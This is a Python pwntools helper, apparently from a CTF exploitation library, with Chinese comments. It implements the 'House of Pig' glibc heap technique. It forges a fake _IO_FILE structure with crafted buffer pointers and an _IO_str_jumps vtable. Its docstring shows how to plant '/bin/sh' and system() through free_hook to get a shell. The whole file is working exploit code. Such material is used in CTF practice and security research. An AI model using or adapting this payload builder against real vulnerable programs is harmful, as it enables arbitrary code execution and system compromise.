'''
    House of Pig
'''
from pwn import *
from base_data import *

def HOP(fake_IO_FILE_addr, str_jumps_addr, user_size, value):
    '''
        
        fake_IO_FILE_addr: 伪造的_IO_FILE结构体地址
        str_jumps_addr: _IO_str_jumps地址
        user_size: 可以分配出来的chunk的大小
        value: 首先会将value写入分配出来的内存中，然后会调用free(*param)
        例如:value设置为 b'/bin/sh\x00' + p64(0) * 2 + p64(system), 然后tcache bin中放入free_hook-0x18的chunk
        注意:能写入的数据大小为 user_size / 2 - 50
        
        要求:必须将free_hook-0x18放入tcache bin中
    '''
    if len(value) > 0x78:
        raise ValueError('value长度不能超过0x78')

    param = fake_IO_FILE_addr + 0x48
    
    payload = b''
    payload = set_value(payload, 0x0, 0x0)                                      # _flags
    payload = set_value(payload, 0x20, 0x0)                                     # _IO_write_base
    payload = set_value(payload, 0x28, param + user_size)                       # _IO_write_ptr
    payload = set_value(payload, 0x38, param)                                   # _IO_buf_base
    payload = set_value(payload, 0x40, param + int((user_size) / 2  - 50))      # _IO_buf_end
    
    payload = payload[:0x48] + value + payload[0x48+len(value):]                # 内置变量

    payload = set_value(payload, 0xC0, 0x0)                                     # _mode = 0
    payload = set_value(payload, 0xD8, str_jumps_addr)                          # vtable
    
    return payload
